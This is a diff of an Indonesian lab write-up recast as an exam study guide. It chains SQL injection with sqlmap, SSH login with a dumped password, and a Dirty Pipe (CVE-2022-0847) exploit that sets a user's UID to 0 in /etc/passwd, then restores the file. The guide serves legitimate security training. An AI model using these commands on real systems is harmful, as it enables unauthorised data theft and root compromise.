@@ -1,8 +1,22 @@
-# Write-Up Lab Gazette — Versi Closed Book
+# Write-Up Lab Gazette — Panduan Ujian Close Book
 
 > **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.
 
-## 1. Gambaran Singkat
+## 0. Cara Menggunakan Catatan Ini
+
+Pelajari dokumen ini dalam tiga lapisan:
+
+```text
+Lapisan 1: hafalkan rantai serangan dan mnemonic.
+Lapisan 2: hafalkan indikator berhasil pada setiap fase.
+Lapisan 3: latih command pada Cheat Sheet 60 Detik.
+```
+
+Kode C Dirty Pipe tidak perlu dihafal baris demi baris. Pahami fungsi dan cara penggunaannya. Source code lengkap tetap tersedia pada **Lampiran A** untuk latihan sebelum ujian.
+
+---
+
+## 1. Peta Serangan
 
 | Komponen | Nilai |
 |---|---|
@@ -13,7 +27,7 @@
 | Privilege escalation | Dirty Pipe / CVE-2022-0847 |
 | Akses akhir | UID `editor` diubah menjadi `0` |
 
-Rantai serangan:
+### Rantai Serangan
 
 ```text
 SQL Injection
@@ -23,9 +37,10 @@ SQL Injection
 → Dirty Pipe
 → ubah UID editor menjadi 0
 → root
+→ restore /etc/passwd
 ```
 
-## 2. Mnemonic: S-D-S-K-P-R
+### Mnemonic: S-D-S-K-P-R
 
 ```text
 S = SQL Injection
@@ -36,9 +51,25 @@ P = Pipe exploit
 R = Root
 ```
 
+### Checkpoint Ujian
+
+| Fase | Indikator yang Dicari |
+|---|---|
+| SQLi | Parameter `id` injectable, DBMS MariaDB/MySQL |
+| Dump | Database `gazette`, tabel `users`, credential editor |
+| SSH | `uid=1001(editor)` |
+| Kernel | Linux `5.10.70-1` |
+| Dirty Pipe | UID pada `/etc/passwd` berubah menjadi `0000` |
+| Root | `uid=0(root)` |
+| Restore | UID editor kembali menjadi `1001` |
+
 ---
 
 # Fase 1 — SQL Injection dan Credential
+
+## 2. Tujuan
+
+Membuktikan SQL Injection dan memperoleh credential yang dapat digunakan untuk akses SSH.
 
 ## 3. Validasi SQL Injection
 
@@ -104,7 +135,7 @@ Username : editor
 Password : password123
 ```
 
-Mnemonic SQLMap:
+### Rumus Hafalan SQLMap
 
 ```text
 D-T-D
@@ -115,7 +146,11 @@ Database → Tables → Dump
 
 # Fase 2 — SSH dan Kernel Check
 
-## 5. Login SSH
+## 5. Tujuan
+
+Mengubah credential aplikasi menjadi foothold sistem dan memeriksa apakah kernel sesuai dengan jalur Dirty Pipe.
+
+## 6. Login SSH
 
 ```bash
 ssh editor@192.168.56.121
@@ -131,15 +166,17 @@ Verifikasi:
 
 ```bash
 id
+whoami
+hostname
 ```
 
-Hasil:
+Indikator:
 
 ```text
 uid=1001(editor) gid=1001(editor)
 ```
 
-## 6. Periksa Sudo dan Kernel
+## 7. Periksa Sudo dan Kernel
 
 ```bash
 sudo -l
@@ -154,24 +191,331 @@ editor tidak memiliki akses sudo
 Linux 5.10.70-1
 ```
 
-Kernel berada pada rentang yang terdampak Dirty Pipe. Versi kernel adalah petunjuk, bukan bukti tunggal; validasi dilakukan menggunakan PoC pada lab.
+Makna:
+
+```text
+Tidak ada jalur sudo.
+Versi kernel menjadi petunjuk untuk memeriksa Dirty Pipe.
+Versi kernel bukan bukti akhir; PoC tetap harus divalidasi pada lab.
+```
 
 ---
 
 # Fase 3 — Menyiapkan Dirty Pipe
 
-## 7. Backup `/etc/passwd`
+## 8. Tujuan
+
+Membuat backup file target, menyiapkan PoC, dan mengompilasi exploit.
+
+## 9. Backup `/etc/passwd`
 
 Jangan lewati langkah ini:
 
 ```bash
 cp /etc/passwd ~/passwd.bak
+ls -l ~/passwd.bak
 ```
 
-## 8. Buat Source Code
+## 10. Buat Source Code
+
+Gunakan source code pada [Lampiran A](#lampiran-a--source-code-dirty-pipe).
+
+Simpan sebagai:
+
+```text
+/home/editor/dirtypipe.c
+```
+
+Kompilasi:
 
 ```bash
-cat > /home/editor/dirtypipe.c <<'EOF'
+cd /home/editor
+gcc -O2 -Wall dirtypipe.c -o dirtypipe
+```
+
+Validasi:
+
+```bash
+ls -l dirtypipe
+file dirtypipe
+```
+
+Indikator:
+
+```text
+File executable dirtypipe berhasil dibuat.
+```
+
+## 11. Konsep yang Wajib Dipahami
+
+Dirty Pipe digunakan untuk menimpa data pada file yang normalnya hanya dapat dibaca oleh user biasa.
+
+Batasan penting PoC:
+
+```text
+1. Offset harus lebih besar dari 0.
+2. Offset tidak boleh tepat di batas halaman 4096 byte.
+3. Data tidak boleh melewati batas halaman.
+4. Panjang data pengganti sebaiknya sama dengan data lama.
+```
+
+---
+
+# Fase 4 — Mengubah UID Menjadi 0
+
+## 12. Tujuan
+
+Menemukan posisi UID user `editor` pada `/etc/passwd`, lalu menimpanya menjadi UID 0.
+
+## 13. Cari Offset Baris `editor`
+
+```bash
+grep -bo 'editor:x:1001:1001' /etc/passwd
+```
+
+Hasil lab:
+
+```text
+2183:editor:x:1001:1001
+```
+
+Posisi UID dimulai sembilan byte setelah awal string:
+
+```text
+2183 + 9 = 2192
+```
+
+Visual:
+
+```text
+editor:x:1001:1001
+         ^
+         offset UID
+```
+
+> Jangan menghafal `2192` sebagai nilai universal. Offset bergantung pada isi `/etc/passwd` target. Hafalkan cara menghitungnya.
+
+## 14. Timpa `1001` Menjadi `0000`
+
+```bash
+./dirtypipe /etc/passwd 2192 0000
+```
+
+Verifikasi:
+
+```bash
+grep '^editor:' /etc/passwd
+```
+
+Hasil:
+
+```text
+editor:x:0000:1001::/home/editor:/bin/bash
+```
+
+Mengapa memakai `0000`:
+
+```text
+1001 = empat karakter
+0000 = empat karakter
+```
+
+Dirty Pipe menimpa data dengan panjang yang sama tanpa menggeser struktur file.
+
+---
+
+# Fase 5 — Root dan Pemulihan
+
+## 15. Tujuan
+
+Memulai sesi baru sebagai user dengan UID 0, membuktikan root, kemudian memulihkan `/etc/passwd`.
+
+## 16. Menjadi Root
+
+Jangan keluar dari sesi SSH lama sebelum pemulihan selesai.
+
+```bash
+su - editor
+```
+
+Masukkan:
+
+```text
+password123
+```
+
+Verifikasi:
+
+```bash
+id
+whoami
+```
+
+Indikator:
+
+```text
+uid=0(root)
+root
+```
+
+## 17. Pulihkan `/etc/passwd`
+
+Setelah root terbukti:
+
+```bash
+install -o root -g root -m 0644 \
+  /home/editor/passwd.bak \
+  /etc/passwd
+```
+
+Verifikasi:
+
+```bash
+grep '^editor:' /etc/passwd
+```
+
+Hasil normal:
+
+```text
+editor:x:1001:1001::/home/editor:/bin/bash
+```
+
+---
+
+# 18. Troubleshooting Inti
+
+### SQLMap tidak mendeteksi SQL Injection
+
+Pastikan parameter yang diuji adalah `id` dan gunakan URL lengkap:
+
+```bash
+sqlmap -u "$URL" -p id --batch --level=3 --risk=2
+```
+
+### SSH gagal walaupun credential sudah ditemukan
+
+Periksa port SSH:
+
+```bash
+nmap -Pn -sV -p22 192.168.56.121
+```
+
+### `gcc: command not found`
+
+Periksa compiler alternatif atau paket yang tersedia:
+
+```bash
+which gcc cc clang
+```
+
+### PoC menghasilkan error offset
+
+Ulangi pencarian offset:
+
+```bash
+grep -bo 'editor:x:1001:1001' /etc/passwd
+```
+
+Hitung posisi UID dari output aktual. Jangan memakai offset contoh apabila isi file berbeda.
+
+### `su - editor` tidak menghasilkan root
+
+Periksa hasil perubahan:
+
+```bash
+grep '^editor:' /etc/passwd
+```
+
+UID harus terbaca sebagai `0000` atau `0`.
+
+---
+
+# 19. Cleanup
+
+Setelah `/etc/passwd` pulih, hapus artefak pengujian:
+
+```bash
+rm -f /home/editor/dirtypipe \
+      /home/editor/dirtypipe.c \
+      /home/editor/passwd.bak
+```
+
+Pastikan:
+
+```bash
+grep '^editor:' /etc/passwd
+id editor
+```
+
+---
+
+# 20. Cheat Sheet 60 Detik
+
+```bash
+# 1. SQLi dan dump
+URL="http://192.168.56.121:8000/news/detail?id=1"
+sqlmap -u "$URL" -p id --batch --dbs
+sqlmap -u "$URL" -p id --batch -D gazette --tables
+sqlmap -u "$URL" -p id --batch -D gazette -T users --dump
+
+# 2. SSH
+ssh editor@192.168.56.121
+# password123
+
+# 3. Kernel dan backup
+cat /proc/version
+cp /etc/passwd ~/passwd.bak
+
+# 4. Compile PoC
+gcc -O2 -Wall dirtypipe.c -o dirtypipe
+
+# 5. Cari offset dan ubah UID
+grep -bo 'editor:x:1001:1001' /etc/passwd
+./dirtypipe /etc/passwd 2192 0000
+
+# 6. Root
+su - editor
+id
+whoami
+
+# 7. Restore
+install -o root -g root -m 0644 ~/passwd.bak /etc/passwd
+```
+
+---
+
+# 21. Checklist Ujian
+
+```text
+[ ] Parameter id terbukti injectable
+[ ] Database gazette ditemukan
+[ ] Tabel users ditemukan
+[ ] Credential editor diperoleh
+[ ] SSH berhasil sebagai editor
+[ ] Kernel diperiksa
+[ ] /etc/passwd dibackup
+[ ] PoC berhasil dikompilasi
+[ ] Offset dihitung dari target aktual
+[ ] UID editor berubah menjadi 0000
+[ ] uid=0(root) terbukti
+[ ] /etc/passwd dipulihkan
+[ ] Artefak pengujian dihapus
+```
+
+## Kalimat Hafalan
+
+```text
+SQLi, dump editor, SSH, cek kernel, backup passwd,
+cari offset, ubah 1001 menjadi 0000, su editor, root, restore.
+```
+
+---
+
+# Lampiran A — Source Code Dirty Pipe
+
+Simpan kode berikut sebagai `/home/editor/dirtypipe.c`.
+
+```c
 /* SPDX-License-Identifier: GPL-2.0 */
 /*
  * Adapted from the Dirty Pipe CVE-2022-0847 proof of concept.
@@ -333,171 +677,4 @@ int main(int argc, char **argv)
 
     return EXIT_SUCCESS;
 }
-EOF
-```
-
-Kompilasi:
-
-```bash
-cd /home/editor
-gcc -O2 -Wall dirtypipe.c -o dirtypipe
-```
-
-Validasi:
-
-```bash
-ls -l dirtypipe
-```
-
----
-
-# Fase 4 — Mengubah UID Menjadi 0
-
-## 9. Cari Offset Baris `editor`
-
-```bash
-grep -bo 'editor:x:1001:1001' /etc/passwd
-```
-
-Hasil lab:
-
-```text
-2183:editor:x:1001:1001
-```
-
-Posisi UID dimulai sembilan byte setelah awal string:
-
-```text
-2183 + 9 = 2192
-```
-
-Visual:
-
-```text
-editor:x:1001:1001
-         ^
-         offset UID
-```
-
-## 10. Timpa `1001` Menjadi `0000`
-
-```bash
-./dirtypipe /etc/passwd 2192 0000
-```
-
-Verifikasi:
-
-```bash
-grep '^editor:' /etc/passwd
-```
-
-Hasil:
-
-```text
-editor:x:0000:1001::/home/editor:/bin/bash
-```
-
-> Dirty Pipe menimpa data dengan panjang yang sama. `1001` dan `0000` sama-sama empat karakter.
-
----
-
-# Fase 5 — Root dan Pemulihan
-
-## 11. Menjadi Root
-
-Jangan keluar dari sesi SSH lama sebelum pemulihan selesai.
-
-```bash
-su - editor
-```
-
-Masukkan:
-
-```text
-password123
-```
-
-Verifikasi:
-
-```bash
-id
-whoami
-```
-
-Indikator:
-
-```text
-uid=0(root)
-root
-```
-
-## 12. Pulihkan `/etc/passwd`
-
-Setelah root terbukti:
-
-```bash
-install -o root -g root -m 0644 \
-  /home/editor/passwd.bak \
-  /etc/passwd
-```
-
-Verifikasi:
-
-```bash
-grep '^editor:' /etc/passwd
-```
-
-Hasil normal:
-
-```text
-editor:x:1001:1001::/home/editor:/bin/bash
-```
-
-Hapus file pengujian:
-
-```bash
-rm -f /home/editor/dirtypipe \
-      /home/editor/dirtypipe.c \
-      /home/editor/passwd.bak
-```
-
----
-
-# 13. Cheat Sheet 60 Detik
-
-```bash
-# 1. SQLi dan dump
-URL="http://192.168.56.121:8000/news/detail?id=1"
-sqlmap -u "$URL" -p id --batch --dbs
-sqlmap -u "$URL" -p id --batch -D gazette --tables
-sqlmap -u "$URL" -p id --batch -D gazette -T users --dump
-
-# 2. SSH
-ssh editor@192.168.56.121
-# password123
-
-# 3. Kernel dan backup
-cat /proc/version
-cp /etc/passwd ~/passwd.bak
-
-# 4. Compile PoC
-gcc -O2 -Wall dirtypipe.c -o dirtypipe
-
-# 5. Cari offset dan ubah UID
-grep -bo 'editor:x:1001:1001' /etc/passwd
-./dirtypipe /etc/passwd 2192 0000
-
-# 6. Root
-su - editor
-id
-
-# 7. Restore
-install -o root -g root -m 0644 ~/passwd.bak /etc/passwd
-```
-
-## Kalimat Hafalan
-
-```text
-SQLi, dump editor, SSH, cek kernel, backup passwd,
-cari offset, ubah 1001 menjadi 0000, su editor, root, restore.
 ```
